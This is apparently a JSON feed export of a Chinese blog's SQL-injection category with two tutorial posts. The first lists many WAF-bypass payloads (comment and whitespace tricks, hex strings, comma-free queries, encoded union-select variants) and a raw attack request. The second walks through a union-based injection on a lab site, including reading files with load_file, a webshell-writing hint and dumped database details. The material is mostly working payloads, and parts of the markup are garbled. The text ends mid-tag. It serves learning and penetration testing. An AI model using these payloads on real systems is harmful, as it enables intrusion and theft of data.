{
    "version": "https://jsonfeed.org/version/1",
    "title": "云逸'bolg • All posts by \"sql注入\" category",
    "description": "",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2023/10/31/%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/",
            "url": "http://example.com/2023/10/31/%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/",
            "title": "sql注入绕过",
            "date_published": "2023-10-31T00:53:37.000Z",
            "content_html": "<p>两个空格代替一个空格，用 Tab 代替空格，% a0 = 空格 %20 %09 %0a %0b %0c %0d % a0 %00 /<strong>/ /<em>!</em>/ select * from users where id=1 /<em>!union</em>//<em>!select</em>/1,2,3,4; %09 TAB 键（水平） %0a 新建一行 %0c 新的一页 %0d return 功能 %0b TAB 键（垂直） % a0 空格 可以将空格字符替换成注释 /</strong>/ 还可以使用 /*! 这里的根据 mysql 版本</p>\n<h3 id=\"大小写绕过\"><a class=\"markdownIt-Anchor\" href=\"#大小写绕过\">#</a> 大小写绕过</h3>\n<p>将字符串设置为大小写，例如</p>\n<p>and 1=1 转成 AND 1=1 AnD 1= 1</p>\n<p>select * from users where id=1 UNION SELECT 1,2,3,4</p>\n<p>select * from users where id=1 UniON SelECT 1,2,3,4</p>\n<h3 id=\"浮点数绕过注入\"><a class=\"markdownIt-Anchor\" href=\"#浮点数绕过注入\">#</a> 浮点数绕过注入</h3>\n<p>select * from users where id=8E0union select 1,2,3,4;</p>\n<p>select * from users where id=8.0union select  1,2,3,4</p>\n<h3 id=\"null-值绕-过\"><a class=\"markdownIt-Anchor\" href=\"#null-值绕-过\">#</a> NULL 值绕 过</h3>\n<p>select \\N;  \\N 代表空</p>\n<p>select * from users where id=\\Nunion select 1,2,3,\\N;</p>\n<p>select * from users where id=\\Nunion select 1,2,3,\\Nfrom users;</p>\n<h3 id=\"引号绕过\"><a class=\"markdownIt-Anchor\" href=\"#引号绕过\">#</a> 引号绕过</h3>\n<p>如果 waf 拦截过滤单引号的时候，可以使用双引号 在 mysql 里也可以用双引号作为字符串。</p>\n<p>select * from users where id=‘1’;</p>\n<p>select * from users where id=“1”;</p>\n<p>也可以将字符串转换成 16 进制 再进行查询。</p>\n<p>select hex(‘admin’);</p>\n<p>select * from users where username=‘admin’;</p>\n<p>select * from users where username=0x61646D696E;</p>\n<p>如果 gpc 开启了，但是注入点是整形 也可以用 hex 十六进制进行绕过</p>\n<p>select * from users where id=-1 union select 1,2,(select group_concat(column_name) from information_schema.columns where TABLE_NAME=‘users’ limit 1),4;</p>\n<p>select * from users where id=-1 union select 1,2,(select group_concat(column_name) from information_schema.columns where TABLE_NAME=0x7573657273 limit 1),4;</p>\n<p>可以看到存在整型注入的时候 没有用到单引号 所以可以注入</p>\n<h3 id=\"添加库名绕过\"><a class=\"markdownIt-Anchor\" href=\"#添加库名绕过\">#</a> 添加库名绕过</h3>\n<p>以下两条查询语句，执行的结果是一致的，但是有些 waf 的拦截规则 并不会拦截 [库名].[表名] 这种模式。</p>\n<p>select * from users where id=-1 union select 1,2,3,4 from users;</p>\n<p>select * from users where id=-1 union select 1,2,3,4 from <span class=\"exturl\" data-url=\"aHR0cDovL2FkbWluLnVz\">admin.us</span></p>\n<p>mysql 中也可以添加库名查询表。例如跨库查询 mysql 库里的 usrs 表的内容。 select * from users where id=-1 union select 1,2,3,concat (user,authentication_string) from mysql.user;</p>\n<h3 id=\"去重复绕过\"><a class=\"markdownIt-Anchor\" href=\"#去重复绕过\">#</a> 去重复绕过</h3>\n<p>在 mysql 查询可以使用 distinct 去除查询的重复值。可以利用这点突破 waf 拦截</p>\n<p>select * from users where id=-1 union distinct select 1,2,3,4 from users;</p>\n<p>select * from users where id=-1 union distinct select 1,2,3,version() from users;</p>\n<h3 id=\"反引号绕过\"><a class=\"markdownIt-Anchor\" href=\"#反引号绕过\">#</a> 反引号绕过</h3>\n<p>在 mysql 可以使用  <code>这里是反引号</code>  绕过一些 waf 拦截。字段可以加反引号或者不加，意义相同。</p>\n<p>insert into users(username,password,email)values(‘admin’,‘123456’,‘admin@admin.com’);</p>\n<p>insert into users( <code>username</code> , <code>password</code> , <code>email</code> )values(‘admin’,‘123456’,‘admin@admin.com’);</p>\n<h3 id=\"脚本语言特性绕过\"><a class=\"markdownIt-Anchor\" href=\"#脚本语言特性绕过\">#</a> 脚本语言特性绕过</h3>\n<p>在 php 语言中 id=1&amp;id=2 后面的值会自动覆盖前面的值，不同的语言有不同的特性。可以利用这点绕过一 些 waf 的拦截。</p>\n<p>id=1%00&amp;id=2 union select 1,2,3</p>\n<p>有些 waf 会去匹配第一个 id 参数 1%00 %00 是截断字符，waf 会自动截断 从而不会检测后面的内容。到了 程序中 id 就是等于 id=2 union select 1,2,3 从绕过注入拦截。 其他语言特性</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/jkjkjk.png\" alt=\"\"></p>\n<h3 id=\"逗号绕过\"><a class=\"markdownIt-Anchor\" href=\"#逗号绕过\">#</a> 逗号绕过</h3>\n<p>目前有些防注入脚本都会逗号进行拦截，例如常规注入中必须包含逗号</p>\n<p>select * from users where id=1 union select 1,2,3,4;</p>\n<p>一般会对逗号过滤成空 select * from users where id=1 union select 1 2 3 4; 这样 SQL 语句就会出错。 所以 可以不使用逗号进行 SQL</p>\n<h4 id=\"substr-截取字符串\"><a class=\"markdownIt-Anchor\" href=\"#substr-截取字符串\">#</a> substr 截取字符串</h4>\n<p>select(substr(database() from 1 for 1));</p>\n<p>查询当前库第一个字符 查询 m 等于 select (substr (database () from 1 for 1)) 页面返回正常</p>\n<p>select * from users where id=1 and ‘m’=(select(substr(database() from 1 for 1)));</p>\n<p>可以进一步优化 m 换成 hex 0x6D 这样就避免了单引号</p>\n<p>select * from users where id=1 and 0x6D=(select(substr(database() from 1 for 1)));</p>\n<h4 id=\"min-截取字符串\"><a class=\"markdownIt-Anchor\" href=\"#min-截取字符串\">#</a> min 截取字符串</h4>\n<p>这个 min 函数跟 substr 函数功能相同 如果 substr 函数被拦截或者过滤可以使用这个函数代替。</p>\n<p>select mid (database () from 1 for 1); 这个方法如上。</p>\n<p>select * from users where id=1 and ‘m’=(select(mid(database() from 1 for 1)));</p>\n<p>select * from users where id=1 and 0x6D=(select(mid(database() from 1 for 1)));</p>\n<h4 id=\"使用-join-绕过\"><a class=\"markdownIt-Anchor\" href=\"#使用-join-绕过\">#</a> 使用 join 绕过</h4>\n<p>使用 join 自连接两个表 union select 1,2 #等价于 union select * from (select 1) a join (select 2) b a 和 b 分别是表的别名</p>\n<p>select * from users where id=-1 union select 1,2,3,4;</p>\n<p>select * from users where id=-1 union select * from (select 1)a join (select 2)b join(select 3)c join(select 4)d;</p>\n<p>select * from users where id=-1 union select * from (select 1)a join (select 2)b join(select user())c join(select 4)d;</p>\n<p>可以看到这里也没有使用逗号，从而绕过 waf</p>\n<h4 id=\"like-绕过\"><a class=\"markdownIt-Anchor\" href=\"#like-绕过\">#</a> like 绕过</h4>\n<p>使用 like 模糊查询 select user () like ‘% r%’; 模糊查询成功返回 1 否则返回 0 找到第一个字符后继续进行下一个字符匹配。从而找到所有的字符串 最后就是要查询的内容，这种 SQL 注 入语句也不会存在逗号。从而绕过 waf 拦截</p>\n<h4 id=\"limit-offset-绕过\"><a class=\"markdownIt-Anchor\" href=\"#limit-offset-绕过\">#</a> limit offset 绕过</h4>\n<p>SQL 注入时，如果需要限定条目可以使用 limit 0,1 限定返回条目的数目 limit 0,1 返回条一条记录 如果 对逗号进行拦截时，可以使用 limit 1 默认返回第一条数据。也可以使用 limit 1 offset 0 从零开始返 回第一条记录，这样就绕过 waf</p>\n<h3 id=\"or-and-xor-not-绕过\"><a class=\"markdownIt-Anchor\" href=\"#or-and-xor-not-绕过\">#</a> or and xor not 绕过</h3>\n<p>目前主流的 waf 都会对 id=1 and 1=2、id=1 or 1=2、id=0 or 1=2 id=0 xor 1=1 limit 1 、id=1 xor 1=2 对这些常见的 SQL 注入检测语句进行拦截。像 and 这些还有字符代替 字符如下</p>\n<p>and 等于 &amp;&amp;</p>\n<p>or 等于 ||</p>\n<p>not 等于！</p>\n<p>xor 等于 |</p>\n<p>所以可以转换成这样</p>\n<p>id=1 and 1=1 等于 id=1 &amp;&amp; 1=1</p>\n<p>id=1 and 1=2 等于 id=1 &amp;&amp; 1=2</p>\n<p>id=1 or 1=1 等于 id=1 || 1=1</p>\n<p>id=0 or 1=0 等于   id=0 || 1=0</p>\n<p>可以绕过一些 waf 拦截继续对注入点进行安全检测</p>\n<p>也可以使用运算符号</p>\n<p>id=1 &amp;&amp; 2=1+1</p>\n<p>id=1 &amp;&amp;   2=1-1</p>\n<h3 id=\"ascii-字符对比绕过\"><a class=\"markdownIt-Anchor\" href=\"#ascii-字符对比绕过\">#</a> ascii 字符对比绕过</h3>\n<p>许多 waf 会对 union select 进行拦截 而且通常比较变态，那么可以不使用联合查询注入，可以使用字符 截取对比法，进行突破。</p>\n<p>select substring(user(),1,1);</p>\n<p>select * from users where id=1 and substring(user(),1,1)=‘r’;</p>\n<p>select * from users where id=1 and ascii(substring(user(),1,1))=114;</p>\n<p>最好把’r’换成成 ascii 码 如果开启 gpc int 注入就不能用了。 可以看到构造得 SQL 攻击语句没有使用联合查询 (union select) 也可以把数据查询出来</p>\n<h3 id=\"等号绕过\"><a class=\"markdownIt-Anchor\" href=\"#等号绕过\">#</a> 等号绕过</h3>\n<p>如果程序会对 = 进行拦截 可以使用 like rlike regexp 或者使用 &lt;或者&gt;</p>\n<p>select * from users where id=1 and ascii(substring(user(),1,1))&lt;115;</p>\n<p>select * from users where id=1 and ascii(substring(user(),1,1))&gt;115;</p>\n<p>select * from users where id=1 and (select substring(user(),1,1)like ‘r%’);</p>\n<p>select * from users where id=1 and (select substring(user(),1,1)rlike ‘r’)</p>\n<p>select * from users where id=1 and 1=(select user() regexp ‘^r’);</p>\n<p>select * from users where id=1 and 1=(select user() regexp ‘^a’);</p>\n<p>regexp 后面是正则</p>\n<h3 id=\"双关键词绕过\"><a class=\"markdownIt-Anchor\" href=\"#双关键词绕过\">#</a> 双关键词绕过</h3>\n<p>有些程序会对单词 union、 select 进行转空 但是只会转一次这样会留下安全隐患。 双关键字绕过（若删除掉第一个匹配的 union 就能绕过）</p>\n<p>id=-1’UNIunionONSeLselectECT1,2,3–+ 到数据库里执行会变成 id=-1’UNION SeLECT1,2,3–+ 从而绕过注入</p>\n<h3 id=\"union-select-绕过\"><a class=\"markdownIt-Anchor\" href=\"#union-select-绕过\">#</a> union select 绕过</h3>\n<p>目前不少 waf 都会使用都会对 union select 进行拦截 单个不拦截 一起就进行拦截。</p>\n<p>针对单个关键词绕过 sel&lt;&gt;ect 程序过滤 &lt;&gt; 为空 脚本处理</p>\n<p>sele/<strong>/ct 程序过滤 /</strong>/ 为空</p>\n<p>/<em>!%53eLEct</em>/url 编码与内联注释</p>\n<p>se%0blect 使用空格绕过</p>\n<p>sele% ct 使用百分号绕过</p>\n<p>%53eLEct 编码绕过</p>\n<p>大小写</p>\n<p>uNIoN sELecT 1,2</p>\n<p>union all select 1,2</p>\n<p>union DISTINCT select 1,2</p>\n<p>null+UNION+SELECT+1,2</p>\n<p>/<em>!union</em>//<em>!select</em>/1,2</p>\n<p>union/<strong>/select/</strong>/1,2</p>\n<p>and(select 1)=(Select 0xA<em>1000)/</em>!uNIOn*//<em>!SeLECt</em>/ 1,user()</p>\n<p>/<em>!50000union</em>//<em>!50000select</em>/1,2</p>\n<p>/<em>!40000union</em>//<em>!40000select</em>/1,2</p>\n<p>%0aunion%0aselect 1,2</p>\n<p>%250aunion%250aselect 1,2</p>\n<p>%09union%09select 1,2</p>\n<p>%0caunion%0cselect 1,2</p>\n<p>%0daunion%0dselect 1,2</p>\n<p>%0baunion%0bselect 1,2</p>\n<p>%0d%0aunion%0d%0aselect 1,2</p>\n<p>–+%0d%0aunion–+%0d%0aselect–+%0d%0a1,–+%0d%0a2 /<em>!12345union</em>//<em>!12345select</em>/1,2;</p>\n<p>/<em> 中文</em> /union/<em> 中文</em> /select/<em> 中文</em> / 1,2;</p>\n<p>/* <em>/union/</em> */select/ */1,2;</p>\n<p>/<em>!union</em>//<em>!00000all</em>//<em>!00000select</em>/1,2</p>\n<h3 id=\"unicode-编码绕过\"><a class=\"markdownIt-Anchor\" href=\"#unicode-编码绕过\">#</a> Unicode 编码绕过</h3>\n<p>形式：“\\u” 或者是 “% u” 加上 4 位 16 进制 Unicode 码值。</p>\n<p>iis 会自动进行识别这种编码 有部分 waf 并不会拦截这这种编码</p>\n<p>-1 union select 1,user()</p>\n<p>部分转码</p>\n<p>-1 uni%u006fn sel%u0065ct 1,user()</p>\n<p>全部转码 % u002d% u0031% u0020% u0075% u006e% u0069% u006f% u006e% u0020% u0073% u0065% u006c% u0065% u0063% u0074% u 0020% u0031% u002c% u0075% u0073% u0065% u0072% u0028% u0029</p>\n<h3 id=\"url-编码绕过\"><a class=\"markdownIt-Anchor\" href=\"#url-编码绕过\">#</a> url 编码绕过</h3>\n<p>在 iis 里会自动把 url 编码转换成字符串传到程序中执行。 例如 union select 可以转换成 u%6eion s%65lect  94</p>\n<p>POST /06/vul/sqli/sqli_id.php</p>\n<p>HTTP/1.1 Host: 192.168.0.165</p>\n<p>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8</p>\n<p>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</p>\n<p>Accept-Encoding: gzip, deflate</p>\n<p>Content-Type: application/x-www-form-urlencoded</p>\n<p>Content-Length: 47</p>\n<p>Origin: <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xNjU=\">http://192.168.0.165</span></p>\n<p>Connection: close Referer: <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xNjUvMDYvdnVsL3NxbGkvc3FsaV9pZC5waHA=\">http://192.168.0.165/06/vul/sqli/sqli_id.php</span></p>\n<p>Cookie: PHPSESSID=hk8r159en71pndlu3jvvphenn5</p>\n<p>Upgrade-Insecure-Requests: 1</p>\n<p>id=-1 union%25OAselect%25OA1,user()-- &amp;submit=1</p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2023/10/28/%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/",
            "url": "http://example.com/2023/10/28/%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/",
            "title": "sql注入",
            "date_published": "2023-10-28T11:09:44.000Z",
            "content_html": "<p>对 mysql 不了解的不会语句的去看数据库篇</p>\n<h3 id=\"mysql数据库结构\"><a class=\"markdownIt-Anchor\" href=\"#mysql数据库结构\">#</a> mysql 数据库结构</h3>\n<p>mysql15 以后默认存放一个 infomation_schema 里面 这个库里面有很多表 重点是这三个表 columns 、tables、schemata 表字段 CHEMA_NAME 记录着库的信息</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero1.png\" alt=\"\"></p>\n<p>tables 表字段 TABLE_SCHEMA 、TABLE_NAME 分别记录着库名和表名</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero2.png\" alt=\"\"></p>\n<p>columns 存储该用户创建的所有数据库的库名、标名和字段名</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero3.png\" alt=\"\"></p>\n<p>查询 admin 库中所有表字段</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero4.png\" alt=\"\"></p>\n<p>查询某个库某个表的字段可以这样查询</p>\n<p>select * from information_schema.COLUMNS where TABLE_SCHEMA=‘admin’ and</p>\n<p>TABLE_NAME=‘admin’</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero5.png\" alt=\"\"></p>\n<h3 id=\"2sql注入原理\"><a class=\"markdownIt-Anchor\" href=\"#2sql注入原理\">#</a> 2.sql 注入原理</h3>\n<p>SQL 注入漏洞的产生需要满足以下两个条件  参数用户可控：从前端传给后端的参数内容是用户可以控制的  参数带入数据库查询：传入的参数拼接到 SQL 语句，且带入数据库查询。</p>\n<p>当用户传入参数为 1’的时候，在数据库执行如下所示。</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">' 此 SQL 语句不符合语法规则就会报错。</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>You have an error in your SQL syntax; check the manual that corresponds</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>to your MySQL server version for the right syntax to use near '''</span> at line <span class=\"token number\">1</span> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>当用户传入参数为 <span class=\"token number\">1</span> <span class=\"token operator\">and</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span> 时 <span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users <span class=\"token keyword\">where</span> id<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token operator\">and</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span> 因为 <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span> 为真</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>id<span class=\"token operator\">=</span><span class=\"token number\">1</span> 也是真 <span class=\"token operator\">and</span> 两边均为真 所以页面会返回 id<span class=\"token operator\">=</span><span class=\"token number\">1</span> 的结果。 如果用户传入参数为 <span class=\"token number\">1</span> <span class=\"token operator\">and</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">2</span> 时</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>因为 <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">2</span> 为假 id<span class=\"token operator\">=</span><span class=\"token number\">1</span> 为真 <span class=\"token operator\">and</span> 两边有一个为假，所以页面返回与 id<span class=\"token operator\">=</span><span class=\"token number\">1</span> 不一样的结果。</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>由此可以初步判断存在 <span class=\"token keyword\">SQL</span> 注入漏洞，攻击者可以进一步拼接  </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>id<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token operator\">and</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>id<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token operator\">and</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>id<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token operator\">or</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>id<span class=\"token operator\">=</span><span class=\"token string\">'1'</span> <span class=\"token operator\">or</span> <span class=\"token string\">'1'</span> <span class=\"token operator\">=</span> <span class=\"token string\">'1'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>id<span class=\"token operator\">=</span><span class=\"token string\">\"1\"</span> <span class=\"token operator\">or</span> <span class=\"token string\">\"1\"</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"1\"</span></pre></td></tr></table></figure><p>判断页面是否不一样，还有无回显的情况输入语句页面没有变化但实际上执行了这种还有延时注入给拼接语句时 sleep 5 看页面是不是 5 秒后显示的</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">sql</span>注释符</pre></td></tr><tr><td data-num=\"2\"></td><td><pre> <span class=\"token comment\"># 单行注释 url 编码 %23</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*  */</span> 多行注释 <span class=\"token comment\">/**/</span>当空格用</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">--\"空格\" 单行注释</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">--+ 也可以</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>是否存在注入判断注入的类型是什么</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>判断字段数 <span class=\"token keyword\">order</span> <span class=\"token keyword\">by</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>确定回显点 <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>查询数据库信息 @<span class=\"token variable\">@version</span> @<span class=\"token variable\">@datadir</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>查询用户名，数据库名 <span class=\"token keyword\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>文件读取 <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>load_file<span class=\"token punctuation\">(</span><span class=\"token string\">'C:\\\\wondows\\\\win.ini'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>写入 webshell <span class=\"token keyword\">select</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">into</span> <span class=\"token keyword\">outfile</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>补充一点，使用 <span class=\"token keyword\">sql</span> 注入遇到转义字符串的单引号或者双引号，可使用 HEX 编码绕过</pre></td></tr></table></figure><h3 id=\"注入类型\"><a class=\"markdownIt-Anchor\" href=\"#注入类型\">#</a> 注入类型</h3>\n<p>SQL 注入分类：按 SQLMap 中的分类来看，SQL 注入类型有以下 5 种：</p>\n<p>UNION query SQL injection（可联合查询注入）</p>\n<p>Stacked queries SQL injection（可多语句查询注入）</p>\n<p>堆叠查询 Boolean-based blind SQL injection（布尔型注入）</p>\n<p>Error-based SQL injection（报错型注入）</p>\n<p>Time-based blind SQL injection（基于时间延迟注入）</p>\n<h4 id=\"接受请求类型区分\"><a class=\"markdownIt-Anchor\" href=\"#接受请求类型区分\">#</a> 接受请求类型区分</h4>\n<p>GET 注入</p>\n<p>GET 请求的参数是放在 URL 里的，GET 请求的 URL 传参有长度限制 中文需要 URL 编码</p>\n<p>POST 注入 POST 请求参数是放在请求 body 里的，长度没有限制</p>\n<p>COOKIE 注入 cookie 参数放在请求头信息，提交的时候 服务器会从请求头获取</p>\n<h4 id=\"注入数据类型的区分\"><a class=\"markdownIt-Anchor\" href=\"#注入数据类型的区分\">#</a> 注入数据类型的区分</h4>\n<p>int 整型 select * from users where id=1 sting</p>\n<p>字符型 select * from users where username=‘admin’ like</p>\n<p>搜索型 select * from news where title like ‘% 标题 %’</p>\n<h3 id=\"union-select-联合注入\"><a class=\"markdownIt-Anchor\" href=\"#union-select-联合注入\">#</a> union select 联合注入</h3>\n<p>1, 判断 [<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zcWwuY24vTGVzcy0xLz9pZD0=\">http://www.sql.cn/Less-1/?id=</span>](<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zcWwuY24vTGVzcy0xLz9pZD0tNA==\">http://www.sql.cn/Less-1/?id=-4</span>’ union select 1,2,3 %23)1’ and 1=1 %23</p>\n<p>[<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zcWwuY24vTGVzcy0xLz9pZD0=\">http://www.sql.cn/Less-1/?id=</span>](<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zcWwuY24vTGVzcy0xLz9pZD0tNA==\">http://www.sql.cn/Less-1/?id=-4</span>’ union select 1,2,3 %23)1’ and 1=2 %23</p>\n<p>报错存在注入</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero6.png\" alt=\"\"></p>\n<p>2, 查字段</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">' order by 1 %23  --返回正常</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>?id=1'</span> <span class=\"token keyword\">order</span> <span class=\"token keyword\">by</span> <span class=\"token number\">2</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span>  <span class=\"token comment\">-- 返回正常</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string\">' order by 3 %23  --返回正常</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>?id=1'</span> <span class=\"token keyword\">order</span> <span class=\"token keyword\">by</span> <span class=\"token number\">4</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span>  <span class=\"token comment\">-- 返回错误</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>三个字段</pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero7.png\" alt=\"\"></p>\n<p>利用 union 联合查询收集信息</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token string\">' union select 1,2,3 %23</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>#看哪个字段可以显示信息，利用它获取数据库信息</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>获取数据库信息</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>?id=-1'</span> <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>concat_ws<span class=\"token punctuation\">(</span><span class=\"token keyword\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>version<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>@<span class=\"token variable\">@datadir</span><span class=\"token punctuation\">,</span>@<span class=\"token variable\">@version_compile_os</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>databaes<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">user</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#获取数据库用户名</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>version<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#获取数据库版本</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>@<span class=\"token variable\">@datadir</span> <span class=\"token comment\">#获取数据库路径</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>@<span class=\"token variable\">@version_conpile_os</span> <span class=\"token comment\">#获取操作系统版本</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>Your Login name:</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token operator\">-</span><span class=\"token number\">1</span>' <span class=\"token keyword\">union</span> <span class=\"token keyword\">select</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>security <span class=\"token comment\">#数据库名</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>（<span class=\"token number\">5.7</span><span class=\"token number\">.26</span>） <span class=\"token comment\">#数据库版本</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>（root<span class=\"token variable\">@localhost</span>） <span class=\"token comment\">#数据库用户名</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>（D:\\Everyday<span class=\"token operator\">-</span>tools\\phpstudy_pro\\Extensions\\MySQL5<span class=\"token punctuation\">.</span><span class=\"token number\">7.26</span>\\<span class=\"token keyword\">data</span>\\root<span class=\"token variable\">@localhost</span>）<span class=\"token comment\">#数据库路径</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>Win64 <span class=\"token comment\">#操作系统版本</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>Your Password:<span class=\"token number\">3</span></pre></td></tr></table></figure><p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero8.png\" 